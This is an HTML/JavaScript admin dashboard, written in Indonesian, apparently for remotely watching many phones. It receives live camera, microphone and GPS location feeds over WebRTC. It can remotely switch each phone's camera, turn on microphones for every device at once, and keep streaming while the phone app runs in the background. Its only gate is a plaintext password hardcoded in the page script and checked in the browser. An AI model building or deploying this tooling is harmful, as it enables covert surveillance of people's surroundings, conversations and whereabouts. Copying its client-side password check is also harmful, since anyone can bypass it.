<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Multi-HP - Live Kamera, Suara & Lokasi</title>
  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', 'Segoe UI', sans-serif; }
    body { background: #0B1120; color: #F8FAFC; min-height: 100vh; padding: 18px; }

    .lock-screen {
      position: fixed; inset: 0; z-index: 999;
      background: radial-gradient(circle at top, #172554 0%, #0B1120 65%);
      display: flex; align-items: center; justify-content: center; padding: 20px;
    }
    .lock-screen.hidden { display: none; }
    .lock-card {
      width: 100%; max-width: 370px; background: #111827; border: 1px solid #1F2937;
      border-radius: 16px; padding: 24px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
    }
    .lock-card h2 { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
    .lock-card p { font-size: 12px; color: #94A3B8; margin-bottom: 16px; line-height: 1.45; }
    .lock-input {
      width: 100%; background: #020617; border: 1px solid #334155; color: #F8FAFC;
      border-radius: 8px; padding: 10px 12px; font-size: 13px; outline: none; margin-bottom: 10px;
    }
    .lock-btn { width: 100%; padding: 10px 14px; font-size: 13px; }
    .lock-error { color: #F87171; font-size: 11px; min-height: 16px; margin-bottom: 8px; }

    .container { max-width: 1380px; margin: 0 auto; }
    .topbar {
      display: flex; justify-content: space-between; align-items: center;
      flex-wrap: wrap; gap: 12px; padding-bottom: 16px; margin-bottom: 18px; border-bottom: 1px solid #1E293B;
    }
    .topbar h1 { font-size: 20px; font-weight: 700; }
    .sub { font-size: 12px; color: #94A3B8; margin-top: 4px; }
    .controls { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
    button {
      border: none; border-radius: 8px; padding: 9px 13px;
      font-size: 12px; font-weight: 600; cursor: pointer; color: #FFFFFF; transition: background 0.15s ease;
    }
    .btn-blue { background: #118EE9; }
    .btn-blue:hover { background: #0D7CD0; }
    .btn-indigo { background: #4F46E5; }
    .btn-indigo:hover { background: #4338CA; }
    .btn-emerald { background: #059669; }
    .btn-emerald:hover { background: #047857; }
    .btn-amber { background: #D97706; }
    .btn-amber:hover { background: #B45309; }
    .btn-slate { background: #334155; }
    .btn-slate:hover { background: #475569; }
    .btn-red { background: #991B1B; }
    .btn-red:hover { background: #B91C1C; }
    .btn-sm { padding: 6px 10px; font-size: 11px; border-radius: 6px; }

    .grid-devices { display: grid; grid-template-columns: repeat(auto-fill, minmax(310px, 1fr)); gap: 14px; }
    .device-card { background: #111827; border: 1px solid #1F2937; border-radius: 14px; overflow: hidden; display: flex; flex-direction: column; }
    .video-wrap {
      position: relative; width: 100%; aspect-ratio: 4 / 3; background: #020617;
      display: flex; align-items: center; justify-content: center; overflow: hidden;
    }
    .video-wrap video { width: 100%; height: 100%; object-fit: cover; transform: translateZ(0); }
    .video-placeholder { position: relative; z-index: 2; font-size: 12px; color: #64748B; text-align: center; padding: 12px; }
    .chip-row { position: absolute; top: 8px; left: 8px; right: 8px; z-index: 3; display: flex; justify-content: space-between; gap: 6px; pointer-events: none; }
    .chip { background: rgba(15, 23, 42, 0.85); border: 1px solid rgba(148, 163, 184, 0.25); color: #F8FAFC; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 999px; }
    .chip.live { background: rgba(22, 163, 74, 0.92); border-color: transparent; }
    .chip.bg { background: rgba(217, 119, 6, 0.92); border-color: transparent; }
    .chip.off { background: rgba(185, 28, 28, 0.92); border-color: transparent; }

    .card-body { padding: 12px; display: flex; flex-direction: column; gap: 7px; font-size: 12px; }
    .device-id { font-weight: 700; color: #E2E8F0; font-size: 13px; }
    .meta-line { color: #94A3B8; font-size: 11px; line-height: 1.4; }
    .card-actions { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 4px; }
    .map-link { color: #38BDF8; font-size: 11px; font-weight: 600; text-decoration: none; margin-left: auto; align-self: center; }
    .empty-box { background: #111827; border: 1px solid #1F2937; border-radius: 14px; padding: 36px 20px; text-align: center; color: #64748B; font-size: 13px; }
  </style>
</head>
<body>
  <div id="lockScreen" class="lock-screen">
    <form class="lock-card" onsubmit="handleUnlock(event)">
      <h2>Akses Panel Admin</h2>
      <p>Masukkan password untuk membuka dashboard pantau kamera, suara & lokasi multi-HP.</p>
      <input id="passwordInput" class="lock-input" type="password" placeholder="Masukkan password..." autocomplete="current-password" required />
      <div id="lockError" class="lock-error"></div>
      <button type="submit" class="btn-blue lock-btn">Masuk Panel</button>
    </form>
  </div>

  <div class="container">
    <div class="topbar">
      <div>
        <h1>Panel Pantau Multi-HP (<span id="onlineCount">0</span> Aktif)</h1>
        <div class="sub" id="lobbyStatus">Terkunci • Menunggu verifikasi password...</div>
      </div>
      <div class="controls">
        <button class="btn-blue" onclick="connectAllDevices()">▶ Hubungkan Semua HP</button>
        <button class="btn-indigo" onclick="switchAllCameras('user')">🤳 Semua Depan</button>
        <button class="btn-indigo" onclick="switchAllCameras('environment')">📷 Semua Belakang</button>
        <button class="btn-emerald" onclick="requestMicAllDevices()">🎙️ Aktifkan Mic Semua</button>
        <button class="btn-amber" onclick="muteAllAudio(false)">🔊 Unmute Semua</button>
        <button class="btn-slate" onclick="muteAllAudio(true)">🔇 Mute Semua</button>
        <button class="btn-slate" onclick="pingAllDevices()">🔄 Refresh</button>
        <button class="btn-red" onclick="lockPanel()">🔒 Kunci</button>
      </div>
    </div>

    <div id="devicesGrid" class="grid-devices">
      <div id="emptyBox" class="empty-box" style="grid-column:1/-1;">
        Menunggu perangkat member membuka halaman/APK dan mengizinkan lokasi, kamera & mikrofon...
      </div>
    </div>
  </div>

  <script>
    const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
    const ADMIN_PASSWORD = "JirunSnd27-";
    const AUTH_STORAGE_KEY = "jirun_admin_unlocked_v1";
    const BACKGROUND_GRACE_MS = 30000;

    const PEER_CONFIG = {
      config: {
        iceServers: [
          { urls: "stun:stun.l.google.com:19302" },
          { urls: "stun:stun1.l.google.com:19302" },
          { urls: "stun:stun2.l.google.com:19302" },
          { urls: "stun:stun3.l.google.com:19302" },
          { urls: "stun:stun4.l.google.com:19302" },
          { urls: "stun:global.stun.twilio.com:3478" }
        ]
      }
    };

    let peer = null;
    const devices = {};

    function isUnlocked() {
      return sessionStorage.getItem(AUTH_STORAGE_KEY) === "1";
    }

    function setUnlockedState(unlocked) {
      const lockScreen = document.getElementById("lockScreen");
      const input = document.getElementById("passwordInput");
      const err = document.getElementById("lockError");
      if (unlocked) {
        sessionStorage.setItem(AUTH_STORAGE_KEY, "1");
        lockScreen.classList.add("hidden");
        err.textContent = "";
        initAdminPeer();
      } else {
        sessionStorage.removeItem(AUTH_STORAGE_KEY);
        lockScreen.classList.remove("hidden");
        input.value = "";
        err.textContent = "";
        setTimeout(() => input.focus(), 50);
      }
    }

    function handleUnlock(event) {
      event.preventDefault();
      const input = document.getElementById("passwordInput");
      const err = document.getElementById("lockError");
      if (input.value === ADMIN_PASSWORD) {
        setUnlockedState(true);
      } else {
        err.textContent = "Password salah. Silakan coba lagi.";
        input.select();
      }
    }

    function lockPanel() {
      muteAllAudio(true);
      setUnlockedState(false);
    }

    function attachIceMonitor(id, call) {
      const entry = devices[id];
      const pc = call && call.peerConnection;
      if (!pc || !entry) return;

      entry.iceState = pc.iceConnectionState || "checking";
      pc.addEventListener("iceconnectionstatechange", () => {
        if (!devices[id]) return;
        devices[id].iceState = pc.iceConnectionState;
        if (pc.iceConnectionState === "failed" || pc.iceConnectionState === "disconnected") {
          setTimeout(() => {
            if (devices[id] && devices[id].conn && devices[id].conn.open) {
              devices[id].conn.send({ type: "REQUEST_STREAM", enableMic: true });
            }
          }, 1200);
        }
        syncDeviceCard(id);
      });
    }

    function initAdminPeer() {
      if (!isUnlocked() || peer) return;
      document.getElementById("lobbyStatus").textContent = "Menghubungkan ke Lobby Admin...";
      peer = new Peer(ADMIN_LOBBY_ID, PEER_CONFIG);

      peer.on("open", () => {
        document.getElementById("lobbyStatus").textContent = `Lobby Aktif (${ADMIN_LOBBY_ID}) • Menunggu HP terhubung`;
      });

      peer.on("connection", (conn) => {
        const id = conn.peer;
        const entry = ensureDeviceEntry(id);
        entry.conn = conn;
        entry.closedExplicitly = false;
        entry.connected = true;
        entry.updatedAt = Date.now();
        syncDeviceCard(id);

        const triggerRequest = () => {
          if (conn.open) {
            conn.send({ type: "REQUEST_STREAM", enableMic: true });
          }
        };

        if (conn.open) triggerRequest();
        conn.on("open", triggerRequest);

        conn.on("data", (msg) => {
          if (!msg) return;
          if (msg.type === "HP_CLOSING") {
            entry.closedExplicitly = true;
            entry.connected = false;
            entry.stream = null;
            attachStreamToCard(id, null);
            syncDeviceCard(id);
            return;
          }

          if (msg.type === "HP_PRESENCE") {
            entry.closedExplicitly = false;
            entry.inBackground = Boolean(msg.inBackground);
            entry.facing = msg.facing || entry.facing || "Depan";
            entry.cameraOn = msg.cameraOn !== undefined ? Boolean(msg.cameraOn) : true;
            entry.micOn = Boolean(msg.micOn);
            entry.location = msg.location || entry.location;
            entry.device = msg.device || entry.device;
            entry.connected = true;
            entry.updatedAt = Date.now();

            if ((!entry.stream || !entry.stream.active) && conn.open) {
              conn.send({ type: "REQUEST_STREAM", enableMic: true });
            }
            syncDeviceCard(id);
          }
        });

        conn.on("close", () => {
          if (devices[id]) {
            devices[id].conn = null;
            devices[id].connected = false;
            syncDeviceCard(id);
          }
        });
      });

      peer.on("call", (call) => {
        const id = call.peer;
        const entry = ensureDeviceEntry(id);
        entry.call = call;
        attachIceMonitor(id, call);
        call.answer();
        call.on("stream", (remoteStream) => {
          entry.closedExplicitly = false;
          entry.stream = remoteStream;
          entry.micOn = remoteStream.getAudioTracks().some((t) => t.readyState === "live" && t.enabled);
          entry.connected = true;
          entry.updatedAt = Date.now();
          attachStreamToCard(id, remoteStream);
          syncDeviceCard(id);
        });
        call.on("close", () => {
          entry.call = null;
          entry.iceState = "closed";
          syncDeviceCard(id);
        });
      });

      peer.on("disconnected", () => {
        if (peer && !peer.destroyed) peer.reconnect();
      });
    }

    function ensureDeviceEntry(id) {
      if (!devices[id]) {
        devices[id] = {
          peerId: id,
          facing: "Depan",
          cameraOn: true,
          micOn: false,
          audioMuted: true,
          inBackground: false,
          iceState: "menunggu",
          location: null,
          device: "",
          updatedAt: Date.now(),
          connected: true,
          closedExplicitly: false,
          conn: null,
          call: null,
          stream: null
        };
      }
      return devices[id];
    }

    function requestStreamFromDevice(id, enableMic = true) {
      const entry = devices[id];
      if (!entry || !peer || peer.destroyed) return;
      if (entry.conn && entry.conn.open) {
        entry.conn.send({ type: "REQUEST_STREAM", enableMic });
      }
      if (entry.stream) {
        attachStreamToCard(id, entry.stream);
      }
    }

    function requestMicForDevice(id) {
      const entry = devices[id];
      if (!entry) return;
      entry.audioMuted = false;
      if (entry.conn && entry.conn.open) {
        entry.conn.send({ type: "ENABLE_MIC" });
      }
      applyCardAudioMute(id, false);
      syncDeviceCard(id);
    }

    function requestMicAllDevices() {
      for (const id of Object.keys(devices)) {
        requestMicForDevice(id);
      }
    }

    function toggleDeviceAudioMute(id) {
      const entry = devices[id];
      if (!entry) return;
      const nextMuted = !entry.audioMuted;
      if (!nextMuted && entry.conn && entry.conn.open) {
        entry.conn.send({ type: "ENABLE_MIC" });
      }
      applyCardAudioMute(id, nextMuted);
      syncDeviceCard(id);
    }

    function applyCardAudioMute(id, muted) {
      const entry = devices[id];
      if (entry) entry.audioMuted = Boolean(muted);
      const vid = document.getElementById(`vid_${id}`);
      if (vid) {
        vid.muted = Boolean(muted);
        vid.volume = muted ? 0 : 1;
        if (!muted) {
          vid.play().catch(() => {});
        }
      }
    }

    function muteAllAudio(muted) {
      for (const id of Object.keys(devices)) {
        applyCardAudioMute(id, muted);
        syncDeviceCard(id);
      }
    }

    function connectAllDevices() {
      for (const id of Object.keys(devices)) {
        requestStreamFromDevice(id, true);
      }
    }

    function switchDeviceCamera(id, facing) {
      const entry = devices[id];
      if (entry && entry.conn && entry.conn.open) {
        entry.facing = facing === "environment" ? "Belakang" : "Depan";
        entry.conn.send({ type: "SWITCH_CAM", facing, enableMic: true });
        syncDeviceCard(id);
      }
    }

    function switchAllCameras(facing) {
      for (const id of Object.keys(devices)) {
        switchDeviceCamera(id, facing);
      }
    }

    function pingAllDevices() {
      for (const entry of Object.values(devices)) {
        if (entry.conn && entry.conn.open) {
          entry.conn.send({ type: "PING" });
        }
      }
      syncAllCards();
    }

    function attachStreamToCard(id, stream) {
      const entry = devices[id];
      const vid = document.getElementById(`vid_${id}`);
      const ph = document.getElementById(`ph_${id}`);
      if (!vid || !ph) return;

      if (stream && stream.active) {
        if (vid.srcObject !== stream) {
          vid.srcObject = stream;
        }
        const shouldMute = entry ? Boolean(entry.audioMuted) : true;
        vid.muted = shouldMute;
        vid.volume = shouldMute ? 0 : 1;
        vid.style.display = "block";
        ph.style.display = "none";
        vid.play().catch(() => {});
      } else if (!stream) {
        vid.srcObject = null;
        vid.style.display = "none";
        ph.style.display = "block";
      }
    }

    function escapeHtml(str) {
      if (!str) return "";
      return String(str).replace(/[&<>"']/g, (ch) => ({
        "&": "&amp;", "<": "&lt;", ">": "&gt;", "\"": "&quot;", "'": "&#39;"
      }[ch]));
    }

    function createCardElement(d) {
      const safeId = escapeHtml(d.peerId);
      const card = document.createElement("div");
      card.className = "device-card";
      card.id = `card_${d.peerId}`;
      card.innerHTML = `
        <div class="video-wrap">
          <div class="chip-row">
            <span class="chip" id="status_${safeId}">Menunggu</span>
            <span class="chip">${escapeHtml(d.peerId.slice(-6))}</span>
          </div>
          <video id="vid_${safeId}" autoplay playsinline muted style="display:none;"></video>
          <div id="ph_${safeId}" class="video-placeholder">
            Kamera tidak aktif / menunggu stream...
          </div>
        </div>
        <div class="card-body">
          <div class="device-id">${safeId}</div>
          <div class="meta-line" id="streamDiag_${safeId}">🎥 Stream: Menunggu • 🎙️ Mic: Mengecek</div>
          <div class="meta-line" id="loc_${safeId}">📍 Menunggu koordinat akurat...</div>
          <div class="meta-line" id="dev_${safeId}">📱 Perangkat</div>
          <div class="card-actions" id="act_${safeId}">
            <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'user')">Depan</button>
            <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'environment')">Belakang</button>
            <button class="btn-emerald btn-sm" onclick="requestMicForDevice('${safeId}')">🎙️ Minta Mic</button>
            <button class="btn-amber btn-sm" id="btnAudio_${safeId}" onclick="toggleDeviceAudioMute('${safeId}')">🔇 Unmute</button>
            <button class="btn-blue btn-sm" onclick="requestStreamFromDevice('${safeId}', true)">▶ Putar / Stream</button>
          </div>
        </div>
      `;
      return card;
    }

    function syncDeviceCard(id) {
      const d = devices[id];
      if (!d) return;

      const emptyBox = document.getElementById("emptyBox");
      if (emptyBox) emptyBox.remove();

      const grid = document.getElementById("devicesGrid");
      let card = document.getElementById(`card_${id}`);
      if (!card) {
        card = createCardElement(d);
        grid.appendChild(card);
      }

      const ageMs = Date.now() - (d.updatedAt || 0);
      const ageSec = Math.max(0, Math.round(ageMs / 1000));
      const withinGrace = !d.closedExplicitly && ageMs <= BACKGROUND_GRACE_MS;
      const hasLiveStream = Boolean(d.stream && d.stream.active);
      const hasAudioTrack = Boolean(d.stream && d.stream.getAudioTracks().some((t) => t.readyState === "live"));

      const statusChip = document.getElementById(`status_${id}`);
      const ph = document.getElementById(`ph_${id}`);

      if (!withinGrace) {
        if (d.stream) {
          d.stream = null;
          attachStreamToCard(id, null);
        }
        if (statusChip) {
          statusChip.textContent = `MATI (${ageSec}d)`;
          statusChip.className = "chip off";
        }
        if (ph) {
          ph.textContent = "Kamera mati (aplikasi/halaman benar-benar di-close)";
        }
      } else if (hasLiveStream && d.connected) {
        if (statusChip) {
          statusChip.textContent = d.inBackground
            ? `LATAR BELAKANG • ${d.facing || "Depan"}`
            : `LIVE • ${d.facing || "Depan"}`;
          statusChip.className = d.inBackground ? "chip bg" : "chip live";
        }
        attachStreamToCard(id, d.stream);
      } else {
        if (statusChip) {
          statusChip.textContent = `LATAR BELAKANG (${ageSec}d)`;
          statusChip.className = "chip bg";
        }
        if (ph && !hasLiveStream) {
          ph.textContent = `Menghubungkan stream (${d.iceState || "checking"})...`;
        }
      }

      const diagEl = document.getElementById(`streamDiag_${id}`);
      const btnAudio = document.getElementById(`btnAudio_${id}`);
      if (diagEl) {
        const vidState = hasLiveStream ? "Masuk" : "Belum Masuk";
        const micState = (d.micOn || hasAudioTrack) ? "Aktif" : "Tidak Ada";
        const speakerState = d.audioMuted ? "Muted" : "Unmuted";
        diagEl.textContent = `🎥 Video: ${vidState} • 🎙️ Mic: ${micState} (${speakerState}) • ICE: ${d.iceState || "-"}`;
      }
      if (btnAudio) {
        btnAudio.textContent = d.audioMuted ? "🔇 Unmute" : "🔊 Mute";
      }

      const loc = d.location;
      const hasCoords = loc && typeof loc.lat === "number" && typeof loc.lng === "number";
      const locEl = document.getElementById(`loc_${id}`);
      if (locEl) {
        const jamStr = loc && loc.timeText ? ` • Jam ${loc.timeText}` : "";
        locEl.textContent = hasCoords
          ? `📍 ${loc.lat}, ${loc.lng} (Akurasi ${loc.accuracy || "-"}${jamStr})`
          : "📍 Menunggu koordinat GPS dari HP member...";
      }

      const devEl = document.getElementById(`dev_${id}`);
      if (devEl) {
        devEl.textContent = `📱 ${d.device || "Perangkat"}`;
      }

      const actEl = document.getElementById(`act_${id}`);
      if (actEl) {
        let mapLink = actEl.querySelector(".map-link");
        if (hasCoords) {
          const mapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
          if (!mapLink) {
            mapLink = document.createElement("a");
            mapLink.className = "map-link";
            mapLink.target = "_blank";
            mapLink.rel = "noopener noreferrer";
            mapLink.textContent = "Maps ↗";
            actEl.appendChild(mapLink);
          }
          mapLink.href = mapUrl;
        } else if (mapLink) {
          mapLink.remove();
        }
      }

      const activeCount = Object.values(devices).filter(
        (item) => !item.closedExplicitly && (Date.now() - (item.updatedAt || 0)) <= BACKGROUND_GRACE_MS
      ).length;
      document.getElementById("onlineCount").textContent = activeCount;
    }

    function syncAllCards() {
      for (const id of Object.keys(devices)) {
        syncDeviceCard(id);
      }
    }

    window.addEventListener("DOMContentLoaded", () => {
      if (isUnlocked()) {
        setUnlockedState(true);
      } else {
        setTimeout(() => document.getElementById("passwordInput").focus(), 50);
      }
      setInterval(syncAllCards, 2000);
    });
  </script>
</body>
</html>
